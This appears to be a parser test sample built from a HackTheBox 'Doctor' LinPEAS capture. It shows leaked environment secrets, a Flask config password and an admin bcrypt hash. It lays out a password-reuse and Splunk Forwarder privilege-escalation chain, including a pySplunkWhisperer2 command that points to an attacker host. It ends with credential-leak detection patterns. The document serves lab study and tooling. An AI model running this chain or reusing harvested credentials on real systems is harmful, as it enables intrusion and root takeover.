# HTB Doctor: Full LinPEAS Output (2018/2020-era format): Credential Harvesting

**Platform:** HackTheBox
**Machine:** Doctor
**Source:** raw linpeas.txt from a real engagement (Kali capture, `root@Kali:~/HTB/Doctor# cat linpeas.txt`)
**LinPEAS version:** v2.7.9 by carlospolop
**Year:** ~2020 (older banner/section format: good for testing format drift vs. modern LinPEAS)
**Category:** Environment variable credential leak + Splunk Universal Forwarder (root-owned
non-standard service) + Flask app secret/DB URI leak

## Why this sample matters for ReadPEAS
This is a genuinely OLD LinPEAS output format:
- Section headers use `====================================( Section Name )====================================`
  instead of the box-drawing `╔══════════╣` style used by modern LinPEAS.
- `[+]` prefix lines instead of the newer bullet/color styling.
- No nanosecond timestamps, different date locale (German: "Mai", "Mär").

If ReadPEAS's parser is tuned only against modern LinPEAS section syntax,
this sample will stress-test whether the extractor still finds sections at all.

## Key Section 1: Environment Variables (credential leak)
```
[+] Environment
[i] Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
LC_TIME=de_DE.UTF-8
SECRET_KEY=1234
SHLVL=2
HOME=/home/web
PS1=\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w \$\[\033[00m\] 
LC_MONETARY=de_DE.UTF-8
LOGNAME=web
_=./linpeas.sh
TERM=xterm
PATH=/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin
LC_ADDRESS=de_DE.UTF-8
LANG=en_US.UTF-8
LC_TELEPHONE=de_DE.UTF-8
HISTSIZE=0
SHELL=bash
LC_NAME=de_DE.UTF-8
LESSCLOSE=/usr/bin/lesspipe %s %s
LC_MEASUREMENT=de_DE.UTF-8
LC_IDENTIFICATION=de_DE.UTF-8
LC_NUMERIC=de_DE.UTF-8
SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db
LC_PAPER=de_DE.UTF-8
HISTFILE=/dev/null
LS_OPTIONS=--color=auto
```

## Key Section 2: Splunk Forwarder (root-owned, non-standard port)
```
root        1139  0.1  2.1 257468 85028 ?        Sl   07:35   0:03 splunkd -p 8089 start
```
And in Active Ports:
```
tcp        0      0 0.0.0.0:8089            0.0.0.0:*               LISTEN      -
```
Splunk Universal Forwarder running as root and listening on 8089 is exploitable
via CVE-2018-11409 / pySplunkWhisperer2 (Splunk Universal Forwarder RCE) if an
attacker can reach the management port: a known HTB Doctor path, though the
actual box intended path was via credentials.

## Key Section 3: Flask app credential leak (grep for pwd/password patterns)
```
/home/web/blog/flaskblog/config.py:    MAIL_PASSWORD = "doctor"
```
And SQL injected DB dump:
```
-> Extracting tables from /home/web/blog/flaskblog/site.db (limit 20)
  --> Found interesting column names in user (output limit 10)
CREATE TABLE user (
	id INTEGER NOT NULL, 
	username VARCHAR(20) NOT NULL, 
	email VARCHAR(120) NOT NULL, 
	image_file VARCHAR(20) NOT NULL, 
	password VARCHAR(60) NOT NULL, 
	PRIMARY KEY (id), 
	UNIQUE (username), 
	UNIQUE (email)
)
1, admin, admin@doctor.htb, default.gif, $2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
```

## Exploit Chain (as actually used on this box)
The real path on Doctor: leaked `MAIL_PASSWORD = "doctor"` from config.py was
reused as the SSH/user password for user `shaun` (password reuse across
services: very common CTF pattern). Then `shaun` escalates to root via
the Splunk Universal Forwarder running with a default/known admin password,
using the pySplunkWhisperer2 exploit:
```
python pySplunkWhisperer2_local.py --lhost <attacker_ip> --lport 4444 --payload '$SPLUNK_HOME/bin/splunk restart'
```
(Splunk admin creds are default/reused, giving RCE as root through Splunk's
deployment/forwarder management interface.)

## Detection Patterns for ReadPEAS
1. **Environment credential leak**: grep Environment section for
   `SECRET_KEY=`, `_DATABASE_URI=`, `_PASSWORD=`, `API_KEY=`, `TOKEN=`
   patterns: flag any non-empty value as a HIGH credential finding.
2. **Splunk root process on non-standard port**: grep process list for
   `splunkd` running as `root` + Active Ports section showing `:8089`: flag as HIGH "Splunk Universal Forwarder RCE (pySplunkWhisperer2)".
3. **Config file credential grep**: `_PASSWORD = "..."` inside `.py`/`.php`/
   `.rb`/`.env` files under a home or web directory: flag and suggest
   trying the leaked value for SSH/su as other listed users (credential
   reuse), similar to existing credentials.py module but confirm it
   correctly parses this OLD-format LinPEAS section layout (parenthesis
   headers, not box-drawing).
